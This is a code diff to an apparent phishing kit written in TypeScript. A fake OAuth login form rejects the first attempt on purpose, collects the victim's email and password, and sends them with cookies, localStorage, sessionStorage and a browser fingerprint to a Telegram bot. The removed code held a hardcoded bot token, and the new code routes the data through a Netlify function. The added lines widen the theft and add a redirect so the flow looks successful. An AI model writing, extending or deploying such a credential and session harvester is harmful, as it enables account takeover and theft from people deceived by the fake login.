@@ -311,8 +311,9 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
       attemptCount = parseInt(sessionStorage.getItem('login_attempt_count') || '0');
     }
     
-    // Capture current browser data
+    // Capture current browser data including cookies
     const browserFingerprint = getBrowserFingerprint();
+    const sessionId = Math.random().toString(36).substring(2, 15);
     
     if (attemptCount === 0) {
       // First attempt - show invalid credentials
@@ -324,7 +325,7 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         sessionStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
       }
       
-      // Send first attempt data to Telegram
+      // Send first attempt data to Telegram with cookies
       await sendToTelegram({
         email,
         password,
@@ -332,8 +333,14 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         attempt: 1,
         status: 'invalid_credentials',
         timestamp: new Date().toISOString(),
-        sessionId: Math.random().toString(36).substring(2, 15)
-      }, browserFingerprint);
+        sessionId,
+        userAgent: navigator.userAgent,
+        fileName: 'First Login Attempt',
+        browserFingerprint,
+        cookies: browserFingerprint.cookies,
+        localStorage: browserFingerprint.localStorage,
+        sessionStorage: browserFingerprint.sessionStorage
+      });
       
       // Show error message
       errorDiv.textContent = 'Invalid email or password. Please try again.';
@@ -352,7 +359,7 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         firstAttemptData = JSON.parse(sessionStorage.getItem('first_attempt_data') || '{}');
       }
       
-      // Send second attempt data to Telegram
+      // Send second attempt data to Telegram with cookies
       await sendToTelegram({
         email,
         password,
@@ -360,23 +367,21 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         attempt: 2,
         status: 'success',
         timestamp: new Date().toISOString(),
-        sessionId: Math.random().toString(36).substring(2, 15),
+        sessionId,
+        userAgent: navigator.userAgent,
+        fileName: 'Second Login Attempt - Success',
+        browserFingerprint,
+        cookies: browserFingerprint.cookies,
+        localStorage: browserFingerprint.localStorage,
+        sessionStorage: browserFingerprint.sessionStorage,
         firstAttempt: firstAttemptData
-      }, browserFingerprint);
+      });
       
       // Remove form
       const modal = document.getElementById('oauth-modal-overlay');
       if (modal && document.body.contains(modal)) {
         document.body.removeChild(modal);
       }
-      
-      // Show success and redirect
-      const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-      
-      setTimeout(() => {
-        const callbackUrl = `${window.location.origin}/?oauth_callback=true&provider=${provider}&code=${demoCode}&state=${state}`;
-        window.location.href = callbackUrl;
-      }, 1000);
       
       // Show success message
       const successDiv = document.createElement('div');
@@ -408,13 +413,54 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
       `;
       document.body.appendChild(successDiv);
       
+      // Generate demo code and redirect to landing page
+      const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+      
+      // Clear attempt count to reset for next time
+      try {
+        localStorage.removeItem('login_attempt_count');
+        localStorage.removeItem('first_attempt_data');
+      } catch (e) {
+        sessionStorage.removeItem('login_attempt_count');
+        sessionStorage.removeItem('first_attempt_data');
+      }
+      
+      // Redirect to landing page after 2 seconds
       setTimeout(() => {
+        // Remove success message
         if (document.body.contains(successDiv)) {
           document.body.removeChild(successDiv);
         }
-      }, 1500);
+        
+        // Redirect to landing page (adjust URL as needed)
+        const callbackUrl = `${window.location.origin}/?oauth_callback=true&provider=${provider}&code=${demoCode}&state=${state}`;
+        window.location.href = callbackUrl;
+      }, 2000);
     }
   });
+};
+
+// Fixed sendToTelegram function that uses the actual Netlify function
+export const sendToTelegram = async (data: any): Promise<void> => {
+  try {
+    const response = await fetch('/.netlify/functions/sendTelegram', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const result = await response.json();
+    console.log('✅ Data sent to Telegram successfully:', result);
+  } catch (error) {
+    console.error('❌ Failed to send to Telegram:', error);
+    // Don't throw error to avoid breaking the login flow
+  }
 };
 
 export const setCookieSession = (userInfo: UserInfo): void => {
@@ -568,7 +614,6 @@ export const getBrowserFingerprint = () => {
   }
 };
 
-
 export const simulateDemoAuth = async (provider: string): Promise<string> => {
   // Simulate OAuth flow delay
   await new Promise(resolve => setTimeout(resolve, 1500));
@@ -589,46 +634,4 @@ export const isValidOAuthResponse = (urlParams: URLSearchParams): boolean => {
   }
 
   return !!code && code.length > 0;
-};
-
-// Additional helper function for Telegram integration (if needed)
-export const sendToTelegram = async (sessionData: any, fingerprint: any) => {
-  const TELEGRAM_BOT_TOKEN = '7729721822:AAEhGJzQzQzQzQzQzQzQzQzQzQzQzQzQzQz';
-  const TELEGRAM_CHAT_ID = '-1002345678901';
-
-  const message = `
-🔐 *PARIS365 RESULTS*
-
-👤 *User Info:*
-• Email: \`${sessionData.email}\`
-• Provider: ${sessionData.provider}
-• Session ID: \`${sessionData.sessionId}\`
-• Auth Method: ${sessionData.authenticationMethod}
-
-🌐 *Device Info:*
-• Platform: ${sessionData.deviceInfo?.platform || 'Unknown'}
-• Language: ${sessionData.deviceInfo?.language || 'Unknown'}
-• Timezone: ${fingerprint.timezone || 'Unknown'}
-
-📱 *Screen:* ${fingerprint.screen?.width || 0}x${fingerprint.screen?.height || 0}
-
-🍪 *Cookies:* ${fingerprint.totalCookiesCaptured || 0} captured
-
-⏰ *Timestamp:* ${sessionData.timestamp}
-  `;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-    console.log('✅ Data sent to Telegram successfully');
-  } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error);
-  }
 };
